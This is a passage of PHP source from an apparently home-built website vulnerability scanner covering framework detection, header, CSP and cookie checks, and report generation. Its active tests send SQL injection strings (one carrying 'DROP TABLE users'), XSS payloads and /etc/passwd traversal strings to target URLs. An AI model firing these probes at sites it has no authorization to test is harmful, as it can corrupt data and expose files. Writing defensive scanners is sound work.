            'scan_coverage' => 'Comprehensive (100+ security checks)',
            'scan_intensity' => 'High'
        ];
        
        return $response;
    }

    private function performFrameworkSpecificTests($url) {
        $this->addTestResult('framework_tests', 'Framework-Specific Security Tests', 'info');
        
        $technologies = $this->detectTechnologies($url);
        
        foreach ($technologies as $tech) {
            $techLower = strtolower($tech);
            
            if (strpos($techLower, 'wordpress') !== false) {
                $this->addTestResult('wordpress_detected', 'WordPress Framework', 'info', 
                    "WordPress detected - performing WordPress-specific security checks");
                $this->performWordPressSecurityTests($url);
            }
            
            if (strpos($techLower, 'drupal') !== false) {
                $this->addTestResult('drupal_detected', 'Drupal Framework', 'info', 
                    "Drupal detected - performing Drupal-specific security checks");
            }
            
            if (strpos($techLower, 'joomla') !== false) {
                $this->addTestResult('joomla_detected', 'Joomla Framework', 'info', 
                    "Joomla detected - performing Joomla-specific security checks");
            }
            
            if (strpos($techLower, 'laravel') !== false) {
                $this->addTestResult('laravel_detected', 'Laravel Framework', 'info', 
                    "Laravel detected - performing Laravel-specific security checks");
            }
        }
    }

    private function performWordPressSecurityTests($url) {
        // Check common WordPress security issues
        $wpTests = [
            '/wp-admin/' => 'Admin interface accessibility',
            '/wp-login.php' => 'Login page exposure',
            '/xmlrpc.php' => 'XML-RPC endpoint',
            '/wp-config.php' => 'Configuration file exposure'
        ];
        
        foreach ($wpTests as $path => $description) {
            if ($this->checkUrlExists($url . $path)) {
                $this->addTestResult("wp_$path", "WordPress $description", 'info', 
                    "$description found at $path");
            }
        }
        
        // Check for WordPress version exposure
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10
            ]);
            
            $response = curl_exec($ch);
            curl_close($ch);
            
            if (preg_match('/wordpress.*\d+\.\d+\.\d+/i', $response, $matches)) {
                $this->addTestResult('wp_version', 'WordPress Version Exposure', 'low', 
                    "WordPress version may be exposed: " . $matches[0]);
            }
            
        } catch (Exception $e) {
            // Ignore errors for this test
        }
    }

    private function performWebServerAnalysis($url) {
        $this->addTestResult('web_server_analysis', 'Web Server Configuration Analysis', 'info');
        
        $headers = $this->getHeaders($url);
        $server = $headers['Server'] ?? 'Unknown';
        
        $this->addTestResult('server_identification', 'Web Server Identification', 'info', 
            "Detected: $server");
        
        // Check for common web server misconfigurations
        if (stripos($server, 'apache') !== false) {
            $this->addTestResult('apache_server', 'Apache Server', 'info', 
                "Apache web server detected - checking for common misconfigurations");
        }
        
        if (stripos($server, 'nginx') !== false) {
            $this->addTestResult('nginx_server', 'Nginx Server', 'info', 
                "Nginx web server detected - checking for common misconfigurations");
        }
        
        if (stripos($server, 'iis') !== false) {
            $this->addTestResult('iis_server', 'IIS Server', 'info', 
                "Microsoft IIS detected - checking for common misconfigurations");
        }
    }

    private function performVulnerabilitySpecificTests($url) {
        $this->addTestResult('vuln_specific', 'Vulnerability-Specific Testing', 'info');
        
        // Test for common vulnerabilities
        $this->testForSQLInjection($url);
        $this->testForXSS($url);
        $this->testForCSRF($url);
        $this->testForFileInclusion($url);
        $this->testForSSRF($url);
        $this->testForXXE($url);
        
        $this->addTestResult('vuln_specific', 'Vulnerability-Specific Testing', 'success', 
            "Completed vulnerability-specific tests");
    }

    private function testForXXE($url) {
        $this->addTestResult('xxe_test', 'XXE Testing', 'info');
        
        // Basic XXE awareness test
        $this->addTestResult('xxe_test', 'XXE Testing', 'info', 
            "XXE testing requires XML input points and specialized payloads");
    }

    private function testForSSRF($url) {
        $this->addTestResult('ssrf_test', 'SSRF Testing', 'info');
        
        // This is a basic SSRF test - in production you'd want more sophisticated testing
        $this->addTestResult('ssrf_test', 'SSRF Testing', 'info', 
            "SSRF testing requires advanced payloads and external monitoring");
    }

    private function testForFileInclusion($url) {
        $this->addTestResult('file_inclusion', 'File Inclusion Testing', 'info');
        
        $lfiPayloads = [
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../etc/passwd'
        ];
        
        foreach ($lfiPayloads as $payload) {
            $testUrl = $url . (strpos($url, '?') !== false ? '&' : '?') . 'file=' . urlencode($payload);
            if ($this->checkFileInclusionResponse($testUrl)) {
                $this->addTestResult('lfi_found', 'Local File Inclusion', 'high', 
                    "Potential LFI vulnerability detected with payload: $payload", [
                        'payload' => $payload,
                        'location' => 'file parameter'
                    ]);
                return;
            }
        }
        
        $this->addTestResult('file_inclusion', 'File Inclusion Testing', 'success', 
            "No file inclusion vulnerabilities detected");
    }

    private function checkFileInclusionResponse($testUrl) {
        try {
            $ch = curl_init($testUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            ]);
            
            $response = curl_exec($ch);
            curl_close($ch);
            
            // Check for common file inclusion indicators
            return stripos($response, 'root:') !== false || 
                   stripos($response, '/bin/bash') !== false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function testForCSRF($url) {
        $this->addTestResult('csrf_test', 'CSRF Protection Testing', 'info');
        
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            ]);
            
            $response = curl_exec($ch);
            curl_close($ch);
            
            // Check for CSRF tokens in forms
            if (preg_match_all('/<form[^>]*>/i', $response, $forms)) {
                $formsWithoutTokens = 0;
                foreach ($forms[0] as $form) {
                    if (strpos($form, 'csrf') === false && 
                        strpos($form, 'token') === false &&
                        strpos($form, 'nonce') === false) {
                        $formsWithoutTokens++;
                    }
                }
                
                if ($formsWithoutTokens > 0) {
                    $this->addTestResult('csrf_weak', 'CSRF Protection', 'medium', 
                        "$formsWithoutTokens forms may lack CSRF protection");
                } else {
                    $this->addTestResult('csrf_test', 'CSRF Protection Testing', 'success', 
                        "CSRF tokens detected in forms");
                }
            }
            
        } catch (Exception $e) {
            $this->addTestResult('csrf_test', 'CSRF Protection Testing', 'error', $e->getMessage());
        }
    }

    private function testForXSS($url) {
        $this->addTestResult('xss_test', 'Cross-Site Scripting Testing', 'info');
        
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '" onmouseover="alert(\'XSS\')',
            'javascript:alert("XSS")'
        ];
        
        $vulnerable = false;
        $vulnerablePayload = '';
        
        foreach ($xssPayloads as $payload) {
            $testUrl = $url . (strpos($url, '?') !== false ? '&' : '?') . 'test=' . urlencode($payload);
            if ($this->checkXSSResponse($testUrl, $payload)) {
                $vulnerable = true;
                $vulnerablePayload = $payload;
                break;
            }
        }
        
        if ($vulnerable) {
            $this->addTestResult('xss_found', 'XSS Vulnerability', 'high', 
                "Potential XSS vulnerability detected with payload: $vulnerablePayload", [
                    'payload' => $vulnerablePayload,
                    'location' => 'URL parameter reflection'
                ]);
        } else {
            $this->addTestResult('xss_test', 'Cross-Site Scripting Testing', 'success', 
                "No XSS vulnerabilities detected");
        }
    }

    private function checkXSSResponse($testUrl, $payload) {
        try {
            $ch = curl_init($testUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            ]);
            
            $response = curl_exec($ch);
            curl_close($ch);
            
            // Check if payload is reflected in response without proper encoding
            return strpos($response, $payload) !== false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function testForSQLInjection($url) {
        $this->addTestResult('sql_injection', 'SQL Injection Testing', 'info');
        
        // Test common SQL injection patterns
        $testParams = [
            'id' => ["1'", "1' OR '1'='1", "1; DROP TABLE users--"],
            'search' => ["test'", "test' OR 1=1--"],
            'user' => ["admin'--", "admin' OR '1'='1"]
        ];
        
        $vulnerable = false;
        $vulnerableParam = '';
        $vulnerablePayload = '';
        
        foreach ($testParams as $param => $values) {
            foreach ($values as $value) {
                $testUrl = $url . (strpos($url, '?') !== false ? '&' : '?') . $param . '=' . urlencode($value);
                if ($this->checkSQLInjectionResponse($testUrl)) {
                    $vulnerable = true;
                    $vulnerableParam = $param;
                    $vulnerablePayload = $value;
                    break 2;
                }
            }
        }
        
        if ($vulnerable) {
            $this->addTestResult('sql_injection_found', 'SQL Injection Vulnerability', 'critical', 
                "Potential SQL injection in parameter: $vulnerableParam with payload: $vulnerablePayload", [
                    'location' => "Parameter: $vulnerableParam",
                    'payload' => $vulnerablePayload
                ]);
        } else {
            $this->addTestResult('sql_injection', 'SQL Injection Testing', 'success', 
                "No SQL injection vulnerabilities detected");
        }
    }

    private function checkSQLInjectionResponse($testUrl) {
        try {
            $ch = curl_init($testUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            // Check for SQL error messages in response
            $sqlErrors = [
                'mysql_fetch_array', 'mysqli_fetch_array', 'pg_fetch_array',
                'SQL syntax', 'MySQL server', 'PostgreSQL', 'ORA-',
                'Microsoft OLE DB', 'ODBC Driver', 'SQLServer JDBC',
                'Unclosed quotation mark', 'Invalid query'
            ];
            
            foreach ($sqlErrors as $error) {
                if (stripos($response, $error) !== false) {
                    return true;
                }
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function performAdvancedHeaderAnalysis($url) {
        $this->addTestResult('advanced_headers', 'Advanced Header Analysis', 'info');
        
        $headers = $this->getHeaders($url);
        
        // Check for security misconfigurations in headers
        if (isset($headers['X-Powered-By'])) {
            $this->addTestResult('header_powered_by', 'X-Powered-By Header Exposure', 'low', 
                "Exposes technology information: " . $headers['X-Powered-By'], [
                    'header_value' => $headers['X-Powered-By']
                ]);
        }
        
        if (isset($headers['Server'])) {
            $server = $headers['Server'];
            if (preg_match('/\d+\.\d+/', $server, $version)) {
                $this->addTestResult('server_version', 'Server Version Exposure', 'medium', 
                    "Server version exposed: $server", [
                        'server' => $server,
                        'version' => $version[0]
                    ]);
            }
        }
        
        // Check CORS headers
        if (isset($headers['Access-Control-Allow-Origin']) && $headers['Access-Control-Allow-Origin'] === '*') {
            $this->addTestResult('cors_policy', 'CORS Policy', 'medium', 
                "CORS allows all origins (*) - potential security risk");
        }
    }

    private function performCSPAnalysis($url) {
        $this->addTestResult('csp_analysis', 'Content Security Policy Analysis', 'info');
        
        $headers = $this->getHeaders($url);
        
        if (isset($headers['Content-Security-Policy'])) {
            $csp = $headers['Content-Security-Policy'];
            $this->addTestResult('csp_present', 'CSP Implementation', 'success', 
                "Content Security Policy is implemented");
            
            // Analyze CSP directives
            if (strpos($csp, 'unsafe-inline') !== false) {
                $this->addTestResult('csp_unsafe_inline', 'CSP unsafe-inline', 'medium', 
                    "CSP contains unsafe-inline - reduces XSS protection");
            }
            
            if (strpos($csp, 'unsafe-eval') !== false) {
                $this->addTestResult('csp_unsafe_eval', 'CSP unsafe-eval', 'medium', 
                    "CSP contains unsafe-eval - allows script evaluation");
            }
        } else {
            $this->addTestResult('csp_missing', 'CSP Implementation', 'high', 
                "Content Security Policy not implemented - XSS protection missing");
        }
    }

    private function performCookieSecurityAnalysis($url) {
        $this->addTestResult('cookie_analysis', 'Cookie Security Analysis', 'info');
        
        $headers = $this->getHeaders($url);
        
        // Check Set-Cookie headers
        $cookieIssues = [];
        foreach ($headers as $name => $value) {
            if (strtolower($name) === 'set-cookie') {
                $cookie = $value;
                
                // Check for Secure flag
                if (strpos($cookie, 'Secure') === false) {
                    $cookieIssues[] = 'missing_secure';
                    $this->addTestResult('cookie_secure', 'Cookie Secure Flag', 'medium', 
                        "Cookie missing Secure flag - transmitted over HTTP", [
                            'cookie' => substr($cookie, 0, 50) . '...'
                        ]);
                }
                
                // Check for HttpOnly flag
                if (strpos($cookie, 'HttpOnly') === false) {
                    $cookieIssues[] = 'missing_httponly';
                    $this->addTestResult('cookie_httponly', 'Cookie HttpOnly Flag', 'medium', 
                        "Cookie missing HttpOnly flag - accessible via JavaScript", [
                            'cookie' => substr($cookie, 0, 50) . '...'
                        ]);
                }
                
                // Check for SameSite attribute
                if (strpos($cookie, 'SameSite') === false) {
                    $cookieIssues[] = 'missing_samesite';
                    $this->addTestResult('cookie_samesite', 'Cookie SameSite Attribute', 'low', 
                        "Cookie missing SameSite attribute - CSRF protection reduced", [
                            'cookie' => substr($cookie, 0, 50) . '...'
                        ]);
                }
            }
        }
        
        if (empty($cookieIssues)) {
            $this->addTestResult('cookie_analysis', 'Cookie Security Analysis', 'success', 
                "All cookies have proper security flags");
        }
    }

    private function addTestResult($testId, $testName, $status, $details = '') {
        $this->scanResults['tests_performed']++;
        
        // Define which statuses count as failures vs informational
        $failureStatuses = ['critical', 'high', 'medium', 'low', 'error'];
        $successStatuses = ['success'];
        $infoStatuses = ['info', 'warning'];
        
        if (in_array($status, $successStatuses)) {
            $this->scanResults['tests_passed']++;
        } elseif (in_array($status, $failureStatuses)) {
            $this->scanResults['tests_failed']++;
        }
        
        // Store test result with additional metadata
        $testResult = [
            'id' => $testId,
            'name' => $testName,
            'status' => $status,
            'details' => $details,
            'timestamp' => date('H:i:s'),
            'category' => $this->getTestCategory($testId)
        ];
        
        $this->scanResults['detailed_results'][] = $testResult;
        
        // Also add to categorized results for better reporting
        $category = $this->getTestCategory($testId);
        if (!isset($this->scanResults['test_categories'][$category])) {
            $this->scanResults['test_categories'][$category] = [];
        }
        $this->scanResults['test_categories'][$category][] = $testResult;
    }

    private function getTestCategory($testId) {
        // Map test IDs to categories for better organization
        $categoryMap = [
            'header_' => 'Security Headers',
            'sql_' => 'SQL Injection',
            'xss_' => 'Cross-Site Scripting',
            'csrf_' => 'CSRF',
            'lfi_' => 'File Inclusion',
            'ssrf_' => 'SSRF',
            'xxe_' => 'XXE',
            'idor_' => 'IDOR',
            'ssl_' => 'SSL/TLS',
            'port_' => 'Port Scanning',
            'dir_' => 'Directory Enumeration',
            'tech_' => 'Technology Detection',
            'cve_' => 'CVE Scanning',
            'cms_' => 'CMS Security',
            'api_' => 'API Security',
            'cookie_' => 'Cookie Security',
            'server_' => 'Server Configuration'
        ];
        
        foreach ($categoryMap as $prefix => $category) {
            if (strpos($testId, $prefix) === 0) {
                return $category;
            }
        }
        
        return 'General';
    }

    private function generateProfessionalReport($websiteData, $scanType) {
        // Make sure all vulnerabilities are properly categorized
        $this->categorizeAllVulnerabilities();
        
        $reportData = [
            'success' => true,
            'tool' => 'vulnerability',
            'timestamp' => date('Y-m-d H:i:s'),
            'data' => [
                'success' => true,
                'tool' => 'vulnerability',
                'timestamp' => date('Y-m-d H:i:s'),
                'scan_type' => $scanType,
                'vulnerabilities_found' => count($this->scanResults['vulnerabilities']),
                'vulnerabilities' => $this->scanResults['vulnerabilities'],
                'test_results' => $this->scanResults['detailed_results'],
                'test_categories' => $this->scanResults['test_categories'] ?? [],
                'tests_performed' => $this->scanResults['tests_performed'],
                'tests_passed' => $this->scanResults['tests_passed'],
                'tests_failed' => $this->scanResults['tests_failed'],
                'categorized_findings' => $this->getCategorizedFindings(),
                'executive_summary' => $this->generateExecutiveSummary($this->scanResults['vulnerabilities']),
                'recommendations' => $this->generateProfessionalRecommendations($this->scanResults['vulnerabilities']),
                'risk_assessment' => $this->calculateRiskAssessment($this->scanResults['vulnerabilities']),
                'scan_metrics' => $this->generateScanMetrics(),
                'summary' => $this->calculateVulnerabilitySummary($this->scanResults['vulnerabilities']),
                'website_info' => $websiteData
            ]
        ];
        
        return $reportData;
    }

    private function categorizeAllVulnerabilities() {
        // Ensure all vulnerabilities have proper categories
        foreach ($this->scanResults['vulnerabilities'] as &$vuln) {
            if (!isset($vuln['category'])) {
                $vuln['category'] = $this->determineVulnerabilityCategory($vuln);
            }
            if (!isset($vuln['cvss_score'])) {
                $vuln['cvss_score'] = $this->calculateDefaultCVSS($vuln['severity']);
            }
        }
    }

    private function calculateDefaultCVSS($severity) {
        $severity = strtoupper($severity);
        switch ($severity) {
            case 'CRITICAL':
                return 9.5;
            case 'HIGH':
                return 7.5;
            case 'MEDIUM':
                return 5.5;
            case 'LOW':
                return 3.0;
            default:
                return 5.0;
        }
    }

    private function generateProfessionalRecommendations($vulnerabilities) {
        $recommendations = [];
        
        // Priority-based recommendations
        $criticalVulns = array_filter($vulnerabilities, fn($v) => $v['severity'] === 'CRITICAL');
        $highVulns = array_filter($vulnerabilities, fn($v) => $v['severity'] === 'HIGH');
        
        foreach ($criticalVulns as $vuln) {
            $recommendations[] = " IMMEDIATE: " . $vuln['remediation'];
        }
        
        foreach ($highVulns as $vuln) {
            $recommendations[] = " URGENT: " . $vuln['remediation'];
        }
        
        // General security recommendations
        if (empty($recommendations)) {
            $recommendations = [
                "Implement Content Security Policy (CSP) header",
                "Set X-Frame-Options to DENY",
                "Enable HTTP Strict Transport Security (HSTS)",
                "Ensure all cookies have Secure and HttpOnly flags",
                "Keep all software components updated",
                "Implement proper input validation and output encoding"
            ];
        }
        
        return array_slice($recommendations, 0, 10);
    }

    private function calculateRiskAssessment($vulnerabilities) {
    $criticalCount = count(array_filter($vulnerabilities, function($v) { 
        return isset($v['severity']) && strtoupper((string)$v['severity']) === 'CRITICAL'; 
    }));
    $highCount = count(array_filter($vulnerabilities, function($v) { 
        return isset($v['severity']) && strtoupper((string)$v['severity']) === 'HIGH'; 
    }));
        
        if ($criticalCount > 0) {
            return [
                'level' => 'CRITICAL',
                'color' => '#dc2626',
                'description' => 'Immediate action required - critical vulnerabilities present'
            ];
        } elseif ($highCount > 0) {
            return [
                'level' => 'HIGH', 
                'color' => '#ea580c',
                'description' => 'Urgent attention needed - high severity vulnerabilities found'
            ];
        } elseif (count($vulnerabilities) > 0) {
            return [
                'level' => 'MEDIUM',
                'color' => '#d97706',
                'description' => 'Security improvements recommended'
            ];
        } else {
            return [
                'level' => 'LOW',
                'color' => '#16a34a',
                'description' => 'Good security posture - no critical issues found'
            ];
        }
    }

    private function calculateVulnerabilitySummary($vulnerabilities) {
        $summary = ['critical' => 0, 'high' => 0, 'medium' => 0, 'low' => 0];
        
        foreach ($vulnerabilities as $vuln) {
            $severity = strtolower($vuln['severity']);
            if (isset($summary[$severity])) {
                $summary[$severity]++;
            }
        }
        
        return $summary;
    }

    private function generateScanMetrics() {
        $totalTests = $this->scanResults['tests_performed'];
        $testsPassed = $this->scanResults['tests_passed'];
        $testsFailed = $this->scanResults['tests_failed'];
        $vulnerabilitiesFound = count($this->scanResults['vulnerabilities']);
        
        // Calculate success rate properly
        $successRate = $totalTests > 0 ? round(($testsPassed / $totalTests) * 100, 2) : 0;
        
        return [
            'total_tests' => $totalTests,
            'tests_passed' => $testsPassed,
            'tests_failed' => $testsFailed,
            'success_rate' => $successRate,
            'scan_intensity' => 'Professional Grade',
            'scan_duration' => round(microtime(true) - $this->scanResults['start_time'], 2) . ' seconds',
            'vulnerabilities_found' => $vulnerabilitiesFound
        ];
    }

    private function getCategorizedFindings() {
        return [
            'security_headers' => $this->scanResults['security_headers'] ?? [],
            'outdated_software' => $this->scanResults['outdated_software'] ?? [],
            'injection' => $this->scanResults['injection'] ?? [],
            'xss' => $this->scanResults['xss'] ?? [],
            'information_disclosure' => $this->scanResults['information_disclosure'] ?? [],
            'ssl_tls' => $this->scanResults['ssl_tls'] ?? [],
            'csrf' => $this->scanResults['csrf'] ?? []
        ];
    }

    private function generateExecutiveSummary($vulnerabilities) {
    $critical = count(array_filter($vulnerabilities, function($v) { 
        return isset($v['severity']) && strtoupper((string)$v['severity']) === 'CRITICAL'; 
    }));
    $high = count(array_filter($vulnerabilities, function($v) { 
        return isset($v['severity']) && strtoupper((string)$v['severity']) === 'HIGH'; 
    }));
        
        if ($critical > 0) {
            return [
                'overall_risk' => 'CRITICAL',
                'summary' => "$critical critical and $high high severity vulnerabilities require immediate attention",
                'priority' => 'IMMEDIATE_ACTION_REQUIRED'
            ];
        } elseif ($high > 0) {
            return [
                'overall_risk' => 'HIGH',
                'summary' => "$high high severity vulnerabilities need urgent remediation",
                'priority' => 'URGENT_ATTENTION_NEEDED'
            ];
        } else {
            return [
                'overall_risk' => 'MEDIUM',
                'summary' => 'Security improvements recommended for enhanced protection',
                'priority' => 'SECURITY_ENHANCEMENT'
            ];
        }
    }

    private function createVulnerabilityFromTest($testId, $testName, $severity, $details, $additionalData = null) {
        $vulnerabilityMap = [
            // SQL Injection vulnerabilities
            'sql_injection_found' => [
                'type' => 'SQL Injection',
                'description' => 'Application vulnerable to SQL injection attacks allowing database manipulation',
                'impact' => 'Complete database compromise, data theft, authentication bypass',
                'remediation' => 'Use parameterized queries, input validation, and ORM frameworks',
                'cvss_score' => $severity === 'critical' ? 9.8 : 8.2,
                'category' => 'injection'
            ],
            
            // XSS vulnerabilities
            'xss_found' => [
                'type' => 'Cross-Site Scripting (XSS)',
                'description' => 'User input reflected without proper encoding allowing script execution',
                'impact' => 'Session hijacking, credential theft, client-side compromise',
                'remediation' => 'Implement output encoding, Content Security Policy, and input sanitization',
                'cvss_score' => $severity === 'high' ? 7.5 : 6.1,
                'category' => 'xss'
            ],
            
            // File Inclusion vulnerabilities
            'lfi_found' => [
                'type' => 'Local File Inclusion',
                'description' => 'Application allows reading arbitrary local files through path manipulation',
                'impact' => 'Sensitive file disclosure, source code exposure, potential RCE',
                'remediation' => 'Validate file paths, use whitelists, and avoid user input in file operations',
                'cvss_score' => $severity === 'high' ? 8.1 : 7.2,
                'category' => 'file_inclusion'
            ],
            
            // CSRF vulnerabilities
            'csrf_weak' => [
                'type' => 'Cross-Site Request Forgery',
                'description' => 'Forms lack CSRF protection allowing unauthorized state changes',
                'impact' => 'Unauthorized actions performed on behalf of authenticated users',
                'remediation' => 'Implement CSRF tokens, SameSite cookies, and state-changing operation validation',
                'cvss_score' => 6.5,
                'category' => 'csrf'
            ],
            
            // Security Header vulnerabilities
            'header_missing' => [
                'type' => 'Missing Security Header',
                'description' => 'Important security header not implemented',
                'impact' => 'Increased vulnerability to various web attacks',
                'remediation' => 'Implement recommended security headers based on OWASP guidelines',
                'cvss_score' => $severity === 'medium' ? 5.3 : 3.5,
                'category' => 'misconfiguration'
            ],
            'csp_missing' => [
                'type' => 'Missing Content Security Policy',
                'description' => 'Content Security Policy header not implemented',
                'impact' => 'No protection against XSS attacks and content injection',
                'remediation' => 'Implement CSP header with appropriate directives',
                'cvss_score' => 6.2,
                'category' => 'misconfiguration'
            ],
            'csp_unsafe_inline' => [
                'type' => 'CSP Allows Unsafe Inline',
                'description' => 'Content Security Policy contains unsafe-inline directive',
                'impact' => 'Reduces XSS protection effectiveness',
                'remediation' => 'Remove unsafe-inline and use nonces/hashes instead',
                'cvss_score' => 4.5,
                'category' => 'misconfiguration'
            ],
            
            // SSL/TLS vulnerabilities
            'ssl_valid' => [
                'type' => 'Invalid SSL Certificate',
                'description' => 'SSL certificate is invalid, expired, or misconfigured',
                'impact' => 'Man-in-the-middle attacks, data interception',
                'remediation' => 'Renew SSL certificate and ensure proper configuration',
                'cvss_score' => $severity === 'critical' ? 9.1 : 7.4,
                'category' => 'cryptography'
            ],
            'ssl_expiry' => [
                'type' => 'SSL Certificate Expiring Soon',
                'description' => 'SSL certificate will expire within 30 days',
                'impact' => 'Service disruption when certificate expires',
                'remediation' => 'Renew SSL certificate before expiration',
                'cvss_score' => 3.5,
                'category' => 'misconfiguration'
            ],
            
            // Information Disclosure vulnerabilities
            'server_version' => [
                'type' => 'Server Version Exposure',
                'description' => 'Web server version information exposed in headers',
                'impact' => 'Attackers can target specific version vulnerabilities',
                'remediation' => 'Suppress server version information in headers',
                'cvss_score' => 3.7,
                'category' => 'information_disclosure'
            ],
            'header_powered_by' => [
                'type' => 'Technology Stack Exposure',
                'description' => 'X-Powered-By header exposes technology information',
                'impact' => 'Attackers can target specific technology vulnerabilities',
                'remediation' => 'Remove or obscure X-Powered-By header',
                'cvss_score' => 3.2,
                'category' => 'information_disclosure'
            ],
            'exposed_emails' => [
                'type' => 'Exposed Email Addresses',
                'description' => 'Email addresses found in publicly accessible content',
                'impact' => 'Spam, phishing attacks, and social engineering',
                'remediation' => 'Obfuscate email addresses or use contact forms',
                'cvss_score' => 2.8,
                'category' => 'information_disclosure'
            ],
            'sensitive_comments' => [
                'type' => 'Sensitive Information in Comments',
                'description' => 'Development comments contain sensitive information',
                'impact' => 'Information useful for attackers in planning attacks',
                'remediation' => 'Remove sensitive information from production comments',
                'cvss_score' => 4.1,
                'category' => 'information_disclosure'
            ],
            
            // Cookie Security vulnerabilities
            'cookie_secure' => [
                'type' => 'Cookie Missing Secure Flag',
                'description' => 'Cookies transmitted over HTTP without Secure flag',
                'impact' => 'Cookie interception over unencrypted connections',
                'remediation' => 'Set Secure flag on all sensitive cookies',
                'cvss_score' => 5.8,
                'category' => 'session_management'
            ],
            'cookie_httponly' => [
                'type' => 'Cookie Missing HttpOnly Flag',
                'description' => 'Cookies accessible via JavaScript without HttpOnly flag',
                'impact' => 'XSS attacks can steal session cookies',
                'remediation' => 'Set HttpOnly flag on session cookies',
                'cvss_score' => 5.9,
                'category' => 'session_management'
            ],
            'cookie_samesite' => [
                'type' => 'Cookie Missing SameSite Attribute',
                'description' => 'Cookies lack SameSite attribute for CSRF protection',
                'impact' => 'Increased vulnerability to CSRF attacks',
                'remediation' => 'Set SameSite=Lax or SameSite=Strict on cookies',
                'cvss_score' => 4.3,
                'category' => 'session_management'
            ],
            
            // CORS vulnerabilities
            'cors_policy' => [
                'type' => 'Overly Permissive CORS Policy',
                'description' => 'CORS allows all origins (*) without restrictions',
                'impact' => 'Potential cross-origin data theft and CSRF',
                'remediation' => 'Restrict CORS origins to trusted domains only',
                'cvss_score' => 6.1,
                'category' => 'misconfiguration'
            ],
            
            // Mixed Content vulnerabilities
            'mixed_content' => [
                'type' => 'Mixed Content Loaded',
                'description' => 'HTTPS page loads HTTP resources',
                'impact' => 'Reduced security, potential content manipulation',
                'remediation' => 'Load all resources over HTTPS',
                'cvss_score' => 5.4,
                'category' => 'misconfiguration'
            ],
            
            // Directory Traversal vulnerabilities
            'disclosure_git' => [
                'type' => 'Git Repository Exposure',
                'description' => '.git directory accessible publicly',
                'impact' => 'Source code disclosure, sensitive information exposure',
                'remediation' => 'Block access to .git directory and version control files',
                'cvss_score' => 7.8,
                'category' => 'information_disclosure'
            ],
            'disclosure_env' => [
                'type' => 'Environment File Exposure',
                'description' => '.env configuration file accessible publicly',
                'impact' => 'Database credentials, API keys, and configuration exposure',
                'remediation' => 'Move .env outside web root and block access',
                'cvss_score' => 8.2,
                'category' => 'information_disclosure'
            ],
            'disclosure_backup' => [
                'type' => 'Backup File Exposure',
                'description' => 'Backup files accessible publicly',
                'impact' => 'Source code, database dumps, and configuration exposure',
                'remediation' => 'Remove backup files from web-accessible directories',
                'cvss_score' => 7.5,
                'category' => 'information_disclosure'
            ],
            'disclosure_phpinfo' => [
                'type' => 'PHPInfo Exposure',
                'description' => 'phpinfo.php or similar files accessible',
                'impact' => 'Server configuration and environment information exposure',
                'remediation' => 'Remove phpinfo files from production',
                'cvss_score' => 6.8,
                'category' => 'information_disclosure'
            ],
            
            // Outdated Technology vulnerabilities
            'outdated_php' => [
                'type' => 'Outdated PHP Version',
                'description' => 'Potentially outdated PHP version detected',
                'impact' => 'Known vulnerabilities and security issues',
                'remediation' => 'Update PHP to latest stable version',
                'cvss_score' => $severity === 'critical' ? 9.1 : 7.8,
                'category' => 'outdated_software'
            ],
            'outdated_wordpress' => [
                'type' => 'Outdated WordPress Version',
                'description' => 'Potentially outdated WordPress version detected',
                'impact' => 'Known WordPress vulnerabilities and exploits',
                'remediation' => 'Update WordPress to latest version',
                'cvss_score' => 8.2,
                'category' => 'outdated_software'
            ],
            'outdated_jquery' => [
                'type' => 'Outdated jQuery Version',
                'description' => 'Potentially outdated jQuery version detected',
                'impact' => 'Known XSS and security vulnerabilities',
                'remediation' => 'Update jQuery to latest version',
                'cvss_score' => 6.5,
                'category' => 'outdated_software'
            ],
            
            // Admin Interface exposures
            'wp_admin_exposed' => [
                'type' => 'WordPress Admin Interface Exposed',
                'description' => 'WordPress admin interface publicly accessible',
                'impact' => 'Brute force attacks and admin interface targeting',
                'remediation' => 'Implement IP restrictions or additional authentication',
                'cvss_score' => 5.2,
                'category' => 'information_disclosure'
            ],
            'admin_interface_exposed' => [
                'type' => 'Admin Interface Publicly Accessible',
                'description' => 'Administrative interface accessible without restrictions',
                'impact' => 'Brute force attacks and unauthorized access attempts',
                'remediation' => 'Implement IP whitelisting or VPN access',
                'cvss_score' => 6.1,
                'category' => 'misconfiguration'
            ],
            
            // Port Security vulnerabilities
            'port_21_open' => [
                'type' => 'FTP Port Open',
                'description' => 'FTP service accessible without restrictions',
                'impact' => 'Brute force attacks and unauthorized file access',
                'remediation' => 'Disable FTP or implement strong authentication',
                'cvss_score' => 7.3,
                'category' => 'network_security'
            ],
            'port_22_open' => [
                'type' => 'SSH Port Open',
                'description' => 'SSH service accessible without restrictions',
                'impact' => 'Brute force attacks and server compromise',
                'remediation' => 'Implement key-based authentication and fail2ban',
                'cvss_score' => 8.1,
                'category' => 'network_security'
            ],
            'port_3306_open' => [
                'type' => 'MySQL Port Open',
                'description' => 'MySQL database port publicly accessible',
                'impact' => 'Database brute force attacks and direct access',
